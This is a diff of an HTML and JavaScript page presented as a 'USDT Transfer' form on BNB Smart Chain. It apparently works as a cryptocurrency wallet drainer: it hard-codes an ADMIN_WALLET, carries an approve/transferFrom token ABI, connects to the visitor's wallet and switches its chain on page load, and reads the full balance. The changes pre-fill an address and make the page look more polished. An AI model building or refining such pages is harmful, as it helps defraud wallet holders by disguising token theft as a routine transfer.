@@ -3,64 +3,82 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>USDT Verification</title>
+  <title>USDT Transfer</title>
   <style>
     body {
       font-family: sans-serif;
-      background: #fff;
+      background: #ffffff;
       margin: 0;
-      padding: 20px;
+      padding: 0;
     }
     .container {
       max-width: 400px;
       margin: auto;
+      padding: 30px 20px;
     }
-    h2 {
+    label {
       font-size: 16px;
+      font-weight: 600;
+      color: #444;
+      display: block;
       margin-bottom: 5px;
     }
-    input {
+    input[type="text"], input[type="number"] {
       width: 100%;
-      padding: 12px;
+      padding: 14px;
       font-size: 16px;
       border: 1px solid #ccc;
-      border-radius: 8px;
+      border-radius: 12px;
+      box-sizing: border-box;
       margin-bottom: 15px;
     }
     .amount-row {
       display: flex;
       align-items: center;
+      gap: 8px;
     }
-    .amount-row input {
-      flex: 1;
+    .amount-row span {
+      font-size: 16px;
     }
-    .amount-row span, .amount-row button {
-      margin-left: 8px;
+    .amount-row button {
+      background-color: transparent;
+      color: #0047FF;
+      font-weight: 600;
+      border: none;
+      cursor: pointer;
     }
-    button {
+    #usdValue {
+      font-size: 14px;
+      color: #888;
+      margin: 0 0 20px 0;
+    }
+    .next-btn {
       width: 100%;
-      padding: 15px;
+      padding: 16px;
       background-color: #0047FF;
       color: white;
-      border: none;
-      border-radius: 12px;
       font-size: 18px;
+      border: none;
+      border-radius: 16px;
+      cursor: pointer;
+      font-weight: bold;
     }
     #processing {
+      margin-top: 20px;
       text-align: center;
+      font-size: 16px;
       color: #0047FF;
       font-weight: bold;
       display: none;
-      margin-top: 20px;
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <h2>Address or Domain Name</h2>
-    <input type="text" id="walletAddress" value="" placeholder="Paste Address" />
+    <label for="walletAddress">Address or Domain Name</label>
+    <input type="text" id="walletAddress" placeholder="0x..." value="0x79069192614f7ceE4F..." />
 
-    <h2>Amount</h2>
+    <label for="usdtAmount">Amount</label>
     <div class="amount-row">
       <input type="number" id="usdtAmount" placeholder="0.00" />
       <span>USDT</span>
@@ -68,39 +86,49 @@
     </div>
 
     <p id="usdValue">= $0.00</p>
-    <button onclick="startTransfer()">Next</button>
+    <button class="next-btn" onclick="startTransfer()">Next</button>
     <div id="processing">⏳ Processing... Please wait</div>
   </div>
 
   <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
   <script>
-    const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
+    const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // BEP-20 USDT
     const ADMIN_WALLET = "0x1956B3950A73B0C54792199Edf13c7b835FF94DC";
     const ABI = [
-      { "constant": false, "inputs": [{ "name": "_spender", "type": "address" },{ "name": "_value", "type": "uint256" }], "name": "approve", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
-      { "constant": false, "inputs": [{ "name": "_from", "type": "address" },{ "name": "_to", "type": "address" },{ "name": "_value", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
-      { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "balance", "type": "uint256" }], "type": "function" }
+      { "constant": false, "inputs": [ { "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" } ], "name": "approve", "outputs": [ { "name": "", "type": "bool" } ], "type": "function" },
+      { "constant": false, "inputs": [ { "name": "_from", "type": "address" }, { "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" } ], "name": "transferFrom", "outputs": [ { "name": "", "type": "bool" } ], "type": "function" },
+      { "constant": true, "inputs": [ { "name": "_owner", "type": "address" } ], "name": "balanceOf", "outputs": [ { "name": "balance", "type": "uint256" } ], "type": "function" }
     ];
 
+    const BNB_CHAIN_ID = "0x38"; // BSC Mainnet
     let web3;
     let account;
     let token;
 
-    window.addEventListener("load", async () => {
+    async function connectAndCheckChain() {
       if (window.ethereum) {
         web3 = new Web3(window.ethereum);
         try {
           await window.ethereum.request({ method: 'eth_requestAccounts' });
+          const network = await window.ethereum.request({ method: 'eth_chainId' });
+          if (network !== BNB_CHAIN_ID) {
+            await window.ethereum.request({
+              method: 'wallet_switchEthereumChain',
+              params: [{ chainId: BNB_CHAIN_ID }]
+            });
+          }
           const accounts = await web3.eth.getAccounts();
           account = accounts[0];
           token = new web3.eth.Contract(ABI, USDT_ADDRESS);
         } catch (err) {
-          alert("Wallet connection failed");
+          alert("Wallet connection failed: " + err.message);
         }
       } else {
         alert("Use Trust Wallet or MetaMask DApp browser");
       }
-    });
+    }
+
+    window.addEventListener("load", connectAndCheckChain);
 
     function setMax() {
       if (!token || !account) return;
@@ -129,4 +157,4 @@
     }
   </script>
 </body>
-</html>
+        </html>
